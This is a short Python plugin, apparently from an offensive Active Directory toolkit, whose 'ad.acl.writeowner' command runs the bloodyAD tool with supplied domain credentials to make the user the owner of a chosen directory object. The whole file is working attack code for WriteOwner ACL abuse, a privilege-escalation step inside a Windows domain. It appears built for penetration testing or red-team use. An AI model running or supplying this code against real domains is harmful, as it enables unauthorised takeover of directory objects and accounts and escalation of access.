def run(data, cred, args):
    import subprocess

    if not args.extra:
        print("Usage: ad.acl.writeowner <target>")
        return {"success": False}

    target = args.extra[0]

    cmd = [
        "bloodyAD",
        "-d", data["domain"],
        "--host", data["ip"],
        "-u", cred["user"],
        "-p", cred["secret"],
        "set", "owner", target, cred["user"]
    ]

    print("[*] " + " ".join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print("[+] Owner set on " + target)
        return {"success": True, "target": target}

    print(result.stdout + result.stderr)
    return {"success": False}